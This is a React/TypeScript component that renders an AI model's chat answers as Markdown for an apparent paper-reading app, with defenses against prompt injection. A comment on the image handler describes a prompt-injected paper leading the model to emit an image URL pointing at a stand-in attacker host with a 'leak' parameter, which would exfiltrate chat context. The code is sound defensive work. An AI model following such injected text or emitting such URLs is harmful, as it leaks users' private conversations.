import { isValidElement, type ReactNode } from "react";
import ReactMarkdown, { type Options } from "react-markdown";
import remarkGfm from "remark-gfm";
import remarkMath from "remark-math";
import rehypeHighlight from "rehype-highlight";
import rehypeKatex from "rehype-katex";
import "katex/dist/katex.min.css";
import { rehypePaperRefs } from "@/lib/chat/ref-decorations";
import { externalLinkProps } from "@/lib/external-link";
import type { Bibliography } from "@/lib/pdf/bibliography";
import { CopyCodeButton } from "./CopyCodeButton";
import { ThreeSandbox } from "./ThreeSandbox";
import styles from "./Markdown.module.css";

/** Source of a ```threejs fence, if that's what this <pre> wraps. */
function threeCode(children: ReactNode): string | null {
  if (!isValidElement(children)) return null;
  const props = children.props as { className?: string; children?: ReactNode };
  if (!/\blanguage-threejs\b/.test(props.className ?? "")) return null;
  return typeof props.children === "string" ? props.children : null;
}

function codeLanguage(children: ReactNode): string {
  if (!isValidElement(children)) return "code";
  const props = children.props as { className?: string };
  const language = props.className?.match(/\blanguage-([\w-]+)/)?.[1];
  return (
    language?.replace(/^(js|ts)$/, (value) =>
      value === "js" ? "javascript" : "typescript",
    ) ?? "code"
  );
}

function codeText(children: ReactNode): string {
  if (typeof children === "string" || typeof children === "number") {
    return String(children);
  }
  if (Array.isArray(children)) return children.map(codeText).join("");
  if (!isValidElement(children)) return "";
  return codeText((children.props as { children?: ReactNode }).children);
}

function normalizedPaperIdentity(value: string): string | null {
  try {
    const url = new URL(value);
    if (url.protocol !== "http:" && url.protocol !== "https:") return null;
    const host = url.hostname.toLowerCase().replace(/^www\./, "");
    if (host === "arxiv.org") {
      const match = url.pathname.match(
        /^\/(?:abs|pdf)\/([^/]+?)(?:\.pdf)?\/?$/i,
      );
      if (match?.[1]) return `arxiv:${match[1].toLowerCase()}`;
    }
    const path = url.pathname.replace(/\/+$/, "") || "/";
    return `${host}${path}`;
  } catch {
    return null;
  }
}

function linksToCurrentPaper(href: string, paperSourceUrl?: string): boolean {
  if (!paperSourceUrl) return false;
  const hrefIdentity = normalizedPaperIdentity(href);
  return (
    hrefIdentity !== null &&
    hrefIdentity === normalizedPaperIdentity(paperSourceUrl)
  );
}

function CodeFrame({
  children,
  copyCode,
}: {
  children: ReactNode;
  copyCode: boolean;
}) {
  const text = codeText(children).replace(/\n$/, "");
  return (
    <div className={styles.codeFrame}>
      <div className={styles.codeHeader}>
        <span>{codeLanguage(children)}</span>
        {copyCode && <CopyCodeButton code={text} />}
      </div>
      <pre>{children}</pre>
    </div>
  );
}

/**
 * Assistant-message renderer: GFM + $…$/$$…$$ KaTeX. Raw HTML stays dropped
 * (react-markdown default) and KaTeX keeps trust:false — AI output is
 * influenced by web-downloaded paper text, so nothing here may widen it.
 * renderThree swaps ```threejs fences for the sandboxed viewer; leave it
 * off while streaming (partial code) and on the public share page.
 * highlightCode adds syntax colors; leave it off while streaming to avoid
 * repeatedly auto-detecting the language for every partial response chunk.
 * decorateRefs marks paper refs/citations as interactive buttons (handled
 * by the enclosing ChatPanel via delegation — this component stays
 * server-renderable); leave it off while streaming, it re-walks the whole
 * tree per chunk.
 */
export function Markdown({
  content,
  renderThree = false,
  highlightCode = true,
  copyCode = true,
  decorateRefs = false,
  bibliography = null,
  currentOrigin,
  paperSourceUrl,
}: {
  content: string;
  renderThree?: boolean;
  highlightCode?: boolean;
  copyCode?: boolean;
  decorateRefs?: boolean;
  bibliography?: Bibliography | null;
  currentOrigin?: string;
  paperSourceUrl?: string;
}) {
  // After rehypeKatex, so math text is never rewritten (the decorator also
  // skips katex subtrees — MathML annotations hold raw TeX).
  const rehypePlugins: Options["rehypePlugins"] = [rehypeKatex];
  if (decorateRefs) {
    rehypePlugins.push([rehypePaperRefs, { bibliography }]);
  }
  if (highlightCode) {
    rehypePlugins.push([
      rehypeHighlight,
      { detect: true, plainText: ["threejs"] },
    ]);
  }
  return (
    <div className={styles.root}>
      <ReactMarkdown
        remarkPlugins={[remarkGfm, remarkMath]}
        rehypePlugins={rehypePlugins}
        components={{
          a(props) {
            const { node, ...anchorProps } = props;
            void node;
            const href =
              typeof anchorProps.href === "string" ? anchorProps.href : "";
            if (linksToCurrentPaper(href, paperSourceUrl)) {
              return <span>{anchorProps.children}</span>;
            }
            return (
              <a
                {...anchorProps}
                {...externalLinkProps(href, currentOrigin, true)}
              />
            );
          },
          pre(props) {
            const code = renderThree ? threeCode(props.children) : null;
            return code ? (
              <ThreeSandbox code={code} />
            ) : (
              <CodeFrame copyCode={copyCode}>{props.children}</CodeFrame>
            );
          },
          // Never auto-load an image the model put in its answer: a
          // prompt-injected paper can emit ![](https://attacker/?leak=…) and
          // rendering it would silently exfiltrate chat context. Show the URL
          // as a link the user must click instead.
          img(props) {
            const src = typeof props.src === "string" ? props.src : "";
            return (
              <a href={src} target="_blank" rel="noreferrer noopener nofollow">
                {props.alt || src || "image"}
              </a>
            );
          },
        }}
      >
        {content}
      </ReactMarkdown>
    </div>
  );
}
